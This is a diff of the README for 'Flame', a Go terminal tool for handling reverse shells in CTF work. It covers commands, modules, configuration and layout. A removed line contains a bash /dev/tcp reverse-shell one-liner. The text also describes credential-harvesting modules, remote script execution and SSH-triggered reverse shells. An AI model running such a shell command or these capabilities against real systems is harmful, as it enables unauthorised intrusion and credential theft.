@@ -1,154 +1,118 @@
 # Flame
 
-A modern reverse shell handler for CTF competitions, written in Go. Inspired by [Penelope](https://github.com/brightio/penelope) with enhanced features and a polished CLI.
+Flame is a Go TUI for handling reverse shells during CTF work. It listens for sessions, lets you switch between them, provides an interactive shell view, supports upload and download, runs built-in modules in worker sessions, generates payloads, and can bootstrap a session through SSH.
 
-## Features
-
-- **Multi-session management** — Handle multiple reverse shells simultaneously
-- **Automatic PTY upgrade** — Linux shells get a proper TTY automatically
-- **Windows PowerShell support** — Full readline-based interactive shell
-- **File transfers** — HTTP (blazing fast) or base64 chunking fallback, with MD5 verification
-- **Module system** — LinPEAS, WinPEAS, PowerUp, PowerView, LaZagne, pspy, and more
-- **In-memory execution** — Run scripts and .NET assemblies without touching disk
-- **Binbag integration** — Local HTTP file server for instant tool deployment
-- **SSH automation** — Connect via SSH and auto-inject reverse shell
-- **Payload generation** — Bash, Base64, and PowerShell reverse shell payloads
-- **Session logging** — Automatic I/O logging per session
-- **Beautiful CLI** — Lipgloss styling, Bubble Tea confirmations, animated spinners
-
-## Quick Start
-
-```bash
-# Build
-go build -o flame
-
-# Start listener on a network interface
-./flame -i tun0 -p 4444
-
-# Or with a direct IP
-./flame -ip 10.10.14.5 -p 4444
-```
-
-On the target machine:
-
-```bash
-bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
-```
-
-Back in flame:
-
-```
- Reverse shell received on session 1 (10.10.11.123)
-
-󰗣 flame ❯ use 1
-󰗣 flame [1] ❯ shell
-# You're now in a fully upgraded PTY shell!
-```
-
-## Commands
-
-| Command | Description |
-|---------|-------------|
-| `list` / `sessions` | List active sessions |
-| `use <id>` | Select a session |
-| `shell` | Enter interactive shell (F12 to exit) |
-| `upload <local> [remote]` | Upload file to target |
-| `download <remote> [local]` | Download file from target |
-| `modules` | List available modules |
-| `run <module> [args]` | Run a module |
-| `spawn` | Spawn new shell from current session |
-| `rev` | Generate reverse shell payloads from the active listener, including `rev csharp` |
-| `ssh user@host` | SSH + auto reverse shell |
-| `config` | Show/save configuration |
-| `set <option> <value>` | Change runtime settings |
-| `help` | Show all commands |
-
-## Modules
-
-### Linux
-
-| Module | Command | Mode | Description |
-|--------|---------|------|-------------|
-| LinPEAS | `run peas` | In-memory | Privilege escalation scanner |
-| LSE | `run lse` | In-memory | Linux Smart Enumeration |
-| Loot | `run loot` | In-memory | Post-exploitation (creds, keys) |
-| pspy | `run pspy` | Disk + cleanup | Process monitor without root |
-
-### Windows
-
-| Module | Command | Mode | Description |
-|--------|---------|------|-------------|
-| WinPEAS | `run winpeas` | In-memory (.NET) | Privilege escalation scanner |
-| PowerUp | `run powerup` | In-memory (PS1) | Privilege escalation checker |
-| PowerView | `run powerview` | In-memory (PS1) | AD enumeration functions |
-| LaZagne | `run lazagne` | Disk + cleanup | Credential harvester |
-
-### Generic
-
-| Module | Command | Mode | Description |
-|--------|---------|------|-------------|
-| ELF Binary | `run elf <source>` | Disk + cleanup | Run any Linux/native Unix binary from URL or binbag |
-| Shell Script | `run sh <url>` | In-memory | Run any bash script |
-| PowerShell | `run ps1 <url>` | In-memory | Run any PS1 script |
-| .NET | `run dotnet <url>` | In-memory | Run any .NET assembly |
-| Python | `run py <url>` | In-memory | Run any Python script |
-| Privesc | `run privesc` | Disk | Bulk upload privesc tools |
-
-## Configuration
-
-Flame uses `~/.flame/config.toml` for persistent settings:
-
-```bash
-# Enable binbag (local HTTP file server for fast transfers)
-set binbag ~/Lab/binbag
-
-# Switch execution mode
-set mode stealth    # In-memory execution (default)
-set mode speed      # Disk-based execution
-
-# Save settings to config file
-config save
-```
-
-## Documentation
-
-See the [`docs/`](docs/) directory for detailed guides:
-
-- [Sessions & Shell](docs/sessions.md) — Session management, PTY upgrade, Windows shells
-- [File Transfers](docs/transfers.md) — Upload, download, HTTP mode, base64 fallback
-- [Modules](docs/modules.md) — Built-in modules, custom modules, execution modes
-- [Configuration](docs/configuration.md) — Binbag, execution modes, pivot support
+This repository is at `v0.9.0`: feature complete for the current surface, with a planned pre-`1.0` review and refactor pass still tracked in `docs/superpowers/`.
 
 ## Requirements
 
-- Go 1.21+
-- A terminal with [Nerd Fonts](https://www.nerdfonts.com/) for best experience (optional, degrades gracefully)
+- Go 1.25.2
+- A Unix-like environment with a terminal that supports Bubble Tea's alt-screen TUI
+- Optional clipboard helpers for local copy support: `wl-copy`, `xclip`, `xsel`, or `pbcopy`
+- Optional external tools depending on workflow: `sshpass` for password-based `ssh`, `mcs` for `rev csharp <file.exe>`
+
+## Build
+
+```bash
+go build -o flame .
+```
+
+## Run
+
+You must provide either an interface or a direct IP.
+
+```bash
+./flame -i tun0 -p 4444
+./flame -ip 10.10.14.5 -p 4444
+```
+
+Common flags:
+
+- `-i`, `-interface`: interface to bind to
+- `-ip`: direct IP address to bind to
+- `-p`, `-port`: listener port, default `4444`
+
+Once the TUI starts, use `help` or `F1` for the in-app command reference.
+
+## Tests
+
+```bash
+go test ./... -coverprofile=coverage.out
+```
+
+## Configuration
+
+Persistent configuration lives in `~/.flame/config.toml`. If `~/.gummy/` exists from older builds, Flame will migrate it to `~/.flame/` on access.
+
+Current persisted settings:
+
+- `binbag.enabled`
+- `binbag.path`
+- `binbag.http_port`
+- `pivot.enabled`
+- `pivot.host`
+
+Default config shape:
+
+```toml
+[binbag]
+enabled = false
+path = "~/Lab/binbag"
+http_port = 8080
+
+[pivot]
+enabled = false
+host = ""
+```
+
+Runtime files under `~/.flame/` also include data such as TUI input history and generated session logs.
+
+## Main Commands
+
+- `sessions`, `list`, `ls`: list active sessions
+- `use <id>`: select the active session
+- `kill <id>`: close a session
+- `shell`: enter the interactive shell for the selected session
+- `upload <local> [remote]`: upload a file to the target
+- `download <remote> [local]`: download a file from the target
+- `spawn`: ask the current session to spawn another reverse shell
+- `modules`: list built-in modules
+- `run <module> [args...]`: run a module or runner in a worker session
+- `rev`, `rev bash`, `rev ps1`, `rev csharp`, `rev php`: generate payloads
+- `ssh user@host (-p <password> | -i <key>) [--port <port>]`: connect over SSH and trigger a reverse shell back to Flame
+- `binbag ...`: manage the local HTTP tool-serving directory
+- `pivot <ip>`, `pivot off`: rewrite generated URLs and payloads through a forwarder
+- `config`: show current configuration
+- `clear`, `help`, `exit`
+
+## Modules And Runners
+
+Built-in modules registered today:
+
+- Linux: `peas`, `lse`, `loot`, `pspy`, `linexp`
+- Windows: `winpeas`, `seatbelt`, `lazagne`
+- Generic runners: `elf`, `sh` (`bash` alias), `ps1`, `dotnet`, `py`
+
+Execution is split between in-memory runners and disk-backed runners with cleanup, depending on the module.
 
 ## Project Structure
 
-```
-flame/
-├── main.go              # Entry point, CLI flags
-├── internal/
-│   ├── listener.go      # TCP listener
-│   ├── session.go       # Multi-session manager, menu system
-│   ├── shell.go         # Shell I/O (PTY + readline modes)
-│   ├── pty.go           # PTY upgrade system
-│   ├── transfer.go      # File transfers (HTTP + b64)
-│   ├── modules.go       # Module system
-│   ├── config.go        # TOML configuration
-│   ├── runtime_config.go# Thread-safe runtime config
-│   ├── fileserver.go    # HTTP file server
-│   ├── ssh.go           # SSH automation
-│   ├── payloads.go      # Reverse shell payloads
-│   ├── netutil.go       # Network utilities
-│   ├── downloader.go    # HTTP downloader
-│   ├── terminal.go      # Terminal opener
-│   └── ui/
-│       ├── colors.go    # Lipgloss styling
-│       └── spinner.go   # Animated spinners
-└── docs/                # Documentation
-```
+- `main.go`: entry point, flag parsing, listener startup, TUI launch
+- `internal/listener.go`: TCP listener lifecycle and new-session intake
+- `internal/session.go`: current session manager, command dispatch, module orchestration, session selection, and shell-related flows
+- `internal/shell.go` and `internal/pty.go`: shell transport and PTY upgrade handling
+- `internal/transfer.go` and `internal/downloader.go`: upload and download flows
+- `internal/modules.go`: module registry and built-in module implementations
+- `internal/payloads.go`: reverse-shell payload generation and C# compilation helper
+- `internal/ssh.go`: SSH command construction and handoff logic
+- `internal/config.go`, `internal/runtime_config.go`, `internal/paths.go`: persisted config, runtime state, and app data paths
+- `internal/help.go`: canonical help topics rendered in the TUI
+- `internal/tui/`: Bubble Tea app, layout, modals, output pane, clipboard, and status UI
+- `docs/superpowers/specs/` and `docs/superpowers/plans/`: active architecture notes and the pre-`1.0` refactor handoff
+
+## Release Notes
+
+`v0.9.0` is the first tagged release for this repository. It marks the current feature-complete TUI release before the planned architecture cleanup, broader test pass, and consistency review targeted for `1.0.0`.
 
 ## License
 
